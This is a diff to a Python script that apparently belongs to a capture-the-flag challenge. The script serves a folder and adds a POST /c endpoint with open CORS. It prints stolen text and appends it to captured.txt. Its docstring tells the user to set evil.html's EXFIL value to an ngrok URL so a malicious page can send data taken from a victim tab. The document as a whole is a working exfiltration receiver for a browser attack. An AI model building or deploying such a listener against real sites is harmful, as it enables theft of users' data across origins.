@@ -1,17 +1,12 @@
 #!/usr/bin/env python3
 """
-Serve files in this folder (same as: python -m http.server 8080)
-PLUS receive exfiltration without webhook:
+Serve Q2/ + exfil endpoints (run: cd Q2 && python serve_and_capture.py)
 
-  GET /capture?stolen=...   -> prints to console, appends to captured.txt, returns 204
-  CORS: Access-Control-Allow-Origin: *  (so fetch from the flag tab can reach your ngrok URL)
+  GET  /capture?stolen=...  -> legacy
+  POST /c                   -> body = stolen text (short URL for document.title limit)
+  CORS: * for fetch from flag tab
 
-Usage (stop plain http.server first, then):
-  cd Q2
-  python serve_and_capture.py
-
-Then set evil.html EXFIL to:
-  https://YOUR-NGROK-SUBDOMAIN.ngrok-free.dev/capture?stolen=
+Set evil.html EXFIL to: https://YOUR-NGROK.ngrok-free.dev/c
 """
 from __future__ import annotations
 
@@ -30,10 +25,35 @@ class Handler(BaseHTTPRequestHandler):
 
     def _cors(self) -> None:
         self.send_header("Access-Control-Allow-Origin", "*")
-        self.send_header("Access-Control-Allow-Methods", "GET, OPTIONS")
+        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
         self.send_header("Access-Control-Allow-Headers", "Content-Type")
 
     def do_OPTIONS(self) -> None:
+        self.send_response(204)
+        self._cors()
+        self.end_headers()
+
+    def _save(self, stolen: str) -> None:
+        preview = (stolen[:800] + "…") if len(stolen) > 800 else stolen
+        print("=== CAPTURE ===\n", preview, "\n===============", sep="")
+        try:
+            with open(OUT, "a", encoding="utf-8") as fp:
+                fp.write(stolen + "\n---\n")
+        except OSError as e:
+            print("Could not write captured.txt:", e)
+
+    def do_POST(self) -> None:
+        u = urlparse(self.path)
+        if u.path != "/c":
+            self.send_error(404)
+            return
+        try:
+            length = int(self.headers.get("Content-Length", "0"))
+        except ValueError:
+            length = 0
+        raw = self.rfile.read(length) if length else b""
+        stolen = raw.decode("utf-8", errors="replace")
+        self._save(stolen)
         self.send_response(204)
         self._cors()
         self.end_headers()
@@ -45,13 +65,7 @@ class Handler(BaseHTTPRequestHandler):
             qs = parse_qs(u.query)
             raw = qs.get("stolen", [""])[0]
             stolen = unquote(raw)
-            preview = (stolen[:800] + "…") if len(stolen) > 800 else stolen
-            print("=== CAPTURE ===\n", preview, "\n===============", sep="")
-            try:
-                with open(OUT, "a", encoding="utf-8") as fp:
-                    fp.write(stolen + "\n---\n")
-            except OSError as e:
-                print("Could not write captured.txt:", e)
+            self._save(stolen)
             self.send_response(204)
             self._cors()
             self.end_headers()
@@ -90,7 +104,7 @@ def main() -> None:
     os.chdir(ROOT)
     httpd = HTTPServer(("0.0.0.0", PORT), Handler)
     print("Serving %s on 0.0.0.0:%s" % (ROOT, PORT))
-    print("Exfil URL path: /capture?stolen=...")
+    print("Exfil: POST https://<ngrok>/c  (body=text)  or GET /capture?stolen=")
     print("Open: http://127.0.0.1:%s/evil.html" % PORT)
     httpd.serve_forever()
 
